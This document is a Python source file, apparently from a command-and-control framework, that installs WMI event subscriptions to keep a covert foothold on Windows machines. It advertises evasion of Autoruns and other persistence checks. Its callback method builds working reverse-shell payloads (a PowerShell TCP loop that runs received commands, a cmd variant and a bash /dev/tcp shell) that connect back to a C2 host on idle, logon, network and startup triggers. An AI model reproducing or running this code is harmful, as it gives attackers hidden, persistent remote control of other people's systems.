"""
WMI Event Subscription Persistence Handler
============================================

Beacon integration for WMI Event Subscriptions.
Automatically re-establishes connection via WMI triggers.

Workflow:
  1. Initial shell: /bin/bash, cmd.exe, powershell
  2. Install WMI subscription that calls back to C2
  3. Beacon terminates, but WMI subscription persists
  4. System idle 5 min → WMI fires → shell callback
  5. C2 has new beacon connection
  6. Rinse and repeat

Detection Evasion:
  ✓ No files in Startup folder
  ✓ No registry Run keys
  ✓ No scheduled tasks
  ✓ No persistence scripts (WMI native)
  ✓ Autoruns.exe won't see it (non-standard persistence)
  ✓ ProcessMonitor won't see file writes
  ✓ Hidden in WMI database (requires WMI knowledge to find)

Trigger Types:
  1. Idle: System idle 5+ minutes → callback
  2. Logon: User logs in → callback
  3. Network: Network adapter activated → callback
  4. Startup: System boots → callback
  5. Performance: CPU/Memory threshold → callback
"""

import os
import json
import time
import subprocess
from typing import Dict, Any, Optional
import logging

try:
    from cybermodules.wmi_persistence import WMIPersistence, TriggerType
    WMI_AVAILABLE = True
except ImportError:
    WMI_AVAILABLE = False

logger = logging.getLogger(__name__)


class WMIPersistenceHandler:
    """
    Beacon WMI Persistence Handler
    
    Installs WMI Event Subscriptions for automatic callback
    """
    
    def __init__(self, beacon_id: str = "default", c2_url: str = ""):
        """
        Initialize WMI persistence handler
        
        Args:
            beacon_id: Unique beacon identifier
            c2_url: C2 server URL for callbacks
        """
        self.beacon_id = beacon_id
        self.c2_url = c2_url
        self.subscriptions: Dict[str, Dict[str, Any]] = {}
    
    def install_idle_callback(self, shell_type: str = "powershell",
                             idle_minutes: int = 5) -> Optional[Dict[str, Any]]:
        """
        Install WMI subscription that callbacks when system is idle
        
        Useful for: Maintaining presence when user doesn't interact with system
        
        Args:
            shell_type: Type of shell to execute (powershell, cmd, bash)
            idle_minutes: Idle time before triggering
        
        Returns:
            Subscription info or None if failed
        """
        if not WMI_AVAILABLE:
            logger.error("WMI module not available")
            return None
        
        try:
            wmi = WMIPersistence()
            
            # Create callback payload
            payload = self._create_callback_payload(shell_type)
            
            logger.info(f"[WMI] Installing idle trigger (wait {idle_minutes}m)")
            
            subscription = wmi.create_idle_persistence(
                payload=payload,
                idle_minutes=idle_minutes
            )
            
            # Generate installation script
            install_script = wmi.generate_installation_script(subscription)
            
            # Store for later reference
            self.subscriptions[subscription['filter_name']] = subscription
            
            logger.info(f"[WMI] Subscription created: {subscription['filter_name']}")
            logger.debug(f"[WMI] Consumer: {subscription['consumer_name']}")
            
            return {
                **subscription,
                'install_script': install_script
            }
        
        except Exception as e:
            logger.error(f"[WMI] Failed to install idle persistence: {e}")
            return None
    
    def install_logon_callback(self, shell_type: str = "powershell") -> Optional[Dict[str, Any]]:
        """
        Install WMI subscription that callbacks on user logon
        
        Useful for: Automatic callback when user signs in (even new user)
        
        Args:
            shell_type: Type of shell
        
        Returns:
            Subscription info or None
        """
        if not WMI_AVAILABLE:
            return None
        
        try:
            wmi = WMIPersistence()
            payload = self._create_callback_payload(shell_type)
            
            logger.info("[WMI] Installing logon trigger")
            
            subscription = wmi.create_logon_persistence(payload)
            install_script = wmi.generate_installation_script(subscription)
            
            self.subscriptions[subscription['filter_name']] = subscription
            logger.info(f"[WMI] Logon subscription created: {subscription['filter_name']}")
            
            return {
                **subscription,
                'install_script': install_script
            }
        
        except Exception as e:
            logger.error(f"[WMI] Failed to install logon persistence: {e}")
            return None
    
    def install_network_callback(self, shell_type: str = "powershell") -> Optional[Dict[str, Any]]:
        """
        Install WMI subscription that callbacks when network becomes active
        
        Useful for: Laptops that disconnect/reconnect to networks
        
        Args:
            shell_type: Type of shell
        
        Returns:
            Subscription info or None
        """
        if not WMI_AVAILABLE:
            return None
        
        try:
            wmi = WMIPersistence()
            payload = self._create_callback_payload(shell_type)
            
            logger.info("[WMI] Installing network trigger")
            
            subscription = wmi.create_network_persistence(payload)
            install_script = wmi.generate_installation_script(subscription)
            
            self.subscriptions[subscription['filter_name']] = subscription
            logger.info(f"[WMI] Network subscription created: {subscription['filter_name']}")
            
            return {
                **subscription,
                'install_script': install_script
            }
        
        except Exception as e:
            logger.error(f"[WMI] Failed to install network persistence: {e}")
            return None
    
    def install_startup_callback(self, shell_type: str = "powershell") -> Optional[Dict[str, Any]]:
        """
        Install WMI subscription that callbacks on system startup
        
        Useful for: Guaranteed callback after system reboot
        
        Args:
            shell_type: Type of shell
        
        Returns:
            Subscription info or None
        """
        if not WMI_AVAILABLE:
            return None
        
        try:
            wmi = WMIPersistence()
            payload = self._create_callback_payload(shell_type)
            
            logger.info("[WMI] Installing startup trigger")
            
            subscription = wmi.create_startup_persistence(payload)
            install_script = wmi.generate_installation_script(subscription)
            
            self.subscriptions[subscription['filter_name']] = subscription
            logger.info(f"[WMI] Startup subscription created: {subscription['filter_name']}")
            
            return {
                **subscription,
                'install_script': install_script
            }
        
        except Exception as e:
            logger.error(f"[WMI] Failed to install startup persistence: {e}")
            return None
    
    def _create_callback_payload(self, shell_type: str) -> str:
        """
        Create callback payload that connects back to C2
        
        Args:
            shell_type: Type of shell (powershell, cmd, bash)
        
        Returns:
            Payload command
        """
        if shell_type.lower() == "powershell":
            # PowerShell reverse shell
            payload = f"""powershell -NoProfile -ExecutionPolicy Bypass -Command \"\\$s=New-Object Net.Sockets.TCPClient('{self.c2_url.split('://')[1].split(':')[0]}',443);\\$stream=\\$s.GetStream();while(\\$true){{\\$buffer=New-Object System.Byte[] 1024;if(\\$stream.CanRead){{\\$read=\\$stream.Read(\\$buffer,0,1024);if(\\$read -le 0){{break}};\\$data=[System.Text.Encoding]::UTF8.GetString(\\$buffer,0,\\$read);\\$output=Invoke-Expression \\$data 2>&1;\\$stream.Write([System.Text.Encoding]::UTF8.GetBytes(\\$output),0,\\$output.Length)}};Start-Sleep -Milliseconds 100}}\"
"""
        elif shell_type.lower() == "cmd":
            # CMD reverse shell
            payload = f"cmd /c powershell -c \"\\$s=New-Object Net.Sockets.TCPClient('{self.c2_url}',443);\\$s.GetStream()|%%{{%%_|Out-Null}}\""
        else:
            # Bash reverse shell
            payload = f"bash -i >& /dev/tcp/{self.c2_url}/443 0>&1"
        
        return payload
    
    def install_multiple_callbacks(self) -> Dict[str, Dict[str, Any]]:
        """
        Install multiple WMI subscriptions for redundancy
        
        This ensures persistence even if one trigger fails.
        Different triggers fire at different times:
          - Idle: 5 minutes of inactivity
          - Logon: User signs in
          - Startup: System boots
          - Network: Network becomes available
        """
        results = {}
        
        # Install idle trigger
        logger.info("[WMI] Installing multiple subscriptions for redundancy...")
        
        idle_sub = self.install_idle_callback()
        if idle_sub:
            results['idle'] = idle_sub
        
        logon_sub = self.install_logon_callback()
        if logon_sub:
            results['logon'] = logon_sub
        
        startup_sub = self.install_startup_callback()
        if startup_sub:
            results['startup'] = startup_sub
        
        network_sub = self.install_network_callback()
        if network_sub:
            results['network'] = network_sub
        
        logger.info(f"[WMI] Installed {len(results)} subscriptions")
        return results
    
    def execute_installation(self, subscription: Dict[str, Any]) -> bool:
        """
        Execute WMI subscription installation on local system
        
        Args:
            subscription: Subscription dict with install_script
        
        Returns:
            True if successful
        """
        try:
            script = subscription.get('install_script', '')
            
            # Execute PowerShell script
            result = subprocess.run(
                ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', script],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                logger.info(f"[WMI] Installation successful for {subscription['filter_name']}")
                return True
            else:
                logger.error(f"[WMI] Installation failed: {result.stderr}")
                return False
        
        except Exception as e:
            logger.error(f"[WMI] Execution error: {e}")
            return False
    
    def install_all_triggers(self, execute: bool = False) -> Dict[str, Any]:
        """
        Install all trigger types for maximum persistence
        
        Args:
            execute: If True, execute installation immediately
        
        Returns:
            Dict with all subscriptions
        """
        logger.info("[WMI] Installing complete persistence suite...")
        
        subscriptions = self.install_multiple_callbacks()
        
        result = {
            'beacon_id': self.beacon_id,
            'persistence_type': 'WMI Event Subscriptions',
            'subscriptions': subscriptions,
            'total_installed': len(subscriptions),
            'triggers': list(subscriptions.keys()),
            'note': 'No files written to disk - completely hidden in WMI database'
        }
        
        if execute:
            logger.info("[WMI] Executing installation...")
            for trigger_type, sub in subscriptions.items():
                success = self.execute_installation(sub)
                if success:
                    logger.info(f"[WMI✓] {trigger_type} subscription installed")
                else:
                    logger.error(f"[WMI✗] {trigger_type} subscription failed")
        
        return result


# ============ INTEGRATION WITH C2 ============

def example_c2_wmi_persistence():
    """Örnek: C2'den WMI persistence kurma"""
    
    from c2.web_c2_listener import WebC2Listener
    
    c2 = WebC2Listener()
    
    # Beacon kurulsa, WMI subscription kur
    beacon_id = "beacon_001"
    c2_url = "http://192.168.1.100:8443"
    
    handler = WMIPersistenceHandler(beacon_id, c2_url)
    
    # Tüm trigger tiplerini kur
    persistence_info = handler.install_all_triggers(execute=False)
    
    print(f"[+] WMI Persistence Configuration")
    print(f"    Beacon: {beacon_id}")
    print(f"    Triggers installed: {persistence_info['total_installed']}")
    print(f"    Trigger types: {', '.join(persistence_info['triggers'])}")
    print(f"\n[*] Send these scripts to beacon to execute on target system:")
    
    for trigger_type, sub in persistence_info['subscriptions'].items():
        print(f"\n    [{trigger_type}]")
        print(f"    Filter: {sub['filter_name']}")
        print(f"    Consumer: {sub['consumer_name']}")


if __name__ == "__main__":
    print("[*] WMI Persistence Handler Loaded")
    if WMI_AVAILABLE:
        print("[✓] WMI module available")
    else:
        print("[!] WMI module not available - install cybermodules.wmi_persistence")
